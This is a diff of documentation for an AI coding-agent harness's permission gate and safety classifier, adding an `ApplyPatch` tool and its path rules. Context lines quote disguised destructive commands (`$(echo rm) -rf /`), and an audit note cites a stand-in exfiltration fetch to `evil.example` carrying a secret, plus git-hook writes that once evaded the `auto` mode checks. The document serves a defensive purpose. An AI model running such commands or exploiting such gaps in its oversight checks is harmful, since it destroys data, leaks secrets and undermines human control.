@@ -118,7 +118,7 @@ first — `$(echo rm) -rf /`, `x=-rf; rm $x /`, `bash -c '…'`, `eval`, aliases
 Three name classes drive the evaluators. Each built-in tool declares its class in its `#[BuiltInTool]` attribute, and `Tools\Catalog\ToolCatalog` reads them:
 
 - **read-only**: `Read`, `Glob`, `Grep`, `Lsp`, `RepoMap`
-- **write-capable**: `Bash`, `Edit`, `Write`, `Workflow`, `Task`, and anything starting `mcp__`
+- **write-capable**: `Bash`, `Edit`, `Write`, `Workflow`, `ApplyPatch`, `Task`, and anything starting `mcp__`
 - **no-ask** (allowed in every mode; they write only harness-owned state): `Memory`, `Prune`, `Todo`, `Compress`, `Recall`, `Team`
 
 Note what is in *none* of these lists: `WebFetch`, `WebSearch`, `doctor` and `Skill`.
@@ -157,9 +157,9 @@ rule — see [Rules](#rules).
 | Mode | Read-only | Writes | Everything else |
 |---|---|---|---|
 | `default` | Allow | Ask | Ask |
-| `accept-edits` | Allow | `Edit`/`Write` inside the project root Allow; `mkdir`/`touch`/`rmdir` via `Bash` on contained paths Allow; the rest (`rm`, `mv`, `cp` included) Ask | Ask |
-| `plan` | Allow | `Bash` Allow only when every command in it is a known read-only one (no file redirection, no substitution), otherwise Deny; `Edit`/`Write` of a `.md` plan directly in `.sugar-crush/plans/` Allow; every other `Edit`/`Write` and unhinted `mcp__*` Deny | Ask |
-| `auto` | gated by `SafetyClassifier`, with a 3-strike / 20-total circuit breaker; a read-only-hinted `mcp__*` Allow | as classified (`Bash` by command, `Edit`/`Write` by target); unhinted `mcp__*` Ask | as classified (`WebFetch` by its URL) |
+| `accept-edits` | Allow | `Edit`/`Write` inside the project root Allow, and an `ApplyPatch` whose every path is; `mkdir`/`touch`/`rmdir` via `Bash` on contained paths Allow; the rest (`rm`, `mv`, `cp` included) Ask | Ask |
+| `plan` | Allow | `Bash` Allow only when every command in it is a known read-only one (no file redirection, no substitution), otherwise Deny; `Edit`/`Write` of a `.md` plan directly in `.sugar-crush/plans/` Allow, and an `ApplyPatch` touching only such plans; every other `Edit`/`Write`/`ApplyPatch` and unhinted `mcp__*` Deny | Ask |
+| `auto` | gated by `SafetyClassifier`, with a 3-strike / 20-total circuit breaker; a read-only-hinted `mcp__*` Allow | as classified (`Bash` by command, `Edit`/`Write` by target, `ApplyPatch` by its worst path); unhinted `mcp__*` Ask | as classified (`WebFetch` by its URL) |
 | `dont-ask` | Allow | Deny | Deny |
 | `bypass-permissions` | Allow | Allow | Allow |
 
@@ -178,6 +178,12 @@ attached — while `rm ./src/Main.php` ran unprompted. Now:
   `.git`. A gate with no root (an embedder that builds one without it) can only
   judge the spelling: a relative path that stays below the working directory
   is granted, an absolute one asks.
+- **`ApplyPatch` runs without asking only when every path in the patch
+  would** — each file it adds, updates, moves to or deletes, judged the same
+  way (roadmap 3.I-3). One path outside the root or under `.git`,
+  `.sugar-crush` or `.mcp.json` asks for the whole call, and so does a patch
+  that does not parse: it names no path that can be proven inside, and the
+  tool would refuse it anyway.
 - **`rm`, `mv` and `cp` ask**, like every other shell command. `rm` deletes
   content and `cp`/`mv` overwrite their destination; use `Edit`/`Write`, whose
   changes are reviewable, or approve the shell command.
@@ -326,7 +332,7 @@ judge, and each real call is judged when it arrives. A real call with no
 
 ### What `auto` classifies
 
-`SafetyClassifier` reads three tools, each by the argument that carries its
+`SafetyClassifier` reads three tools, and the gate a fourth, each by the argument that carries its
 risk (audit F-P3(b) — before it, only `Bash` was read, so
 `Write .git/hooks/pre-commit`, `WebFetch https://evil.example/?k=SECRET` and
 `mcp__db__drop_table` all ran under `auto`):
@@ -336,6 +342,7 @@ risk (audit F-P3(b) — before it, only `Bash` was read, so
 | `Bash` | one of the command categories (`curl/wget-into-shell`, `external-endpoint`, `force-push-reset-hard`, …) | the command matches a row |
 | `Edit` / `Write` | `protected-path-write` | the target is under `.git`, `.sugar-crush` or `.mcp.json` |
 | `Edit` / `Write` | `outside-root-write` | the target is not provably inside the project root — absolute elsewhere, escaping, `~/…`, a symlink out, or absent |
+| `ApplyPatch` | `outside-root-write`, else `protected-path-write` | as for `Edit`, judged over every path the patch adds, updates, moves to or deletes; the worst one decides, and a patch that does not parse is `outside-root-write` |
 | `WebFetch` | `external-endpoint` | the URL carries a query string or `user:pass@`, or cannot be parsed |
 | `mcp__*` | — (asks) | unless its trusted server declared it read-only (`readOnlyHint: true`, not `openWorldHint: true`), which allows it: an MCP tool's capability is server-defined, so nothing can classify it, and the server's own declaration is the only evidence there is |
 
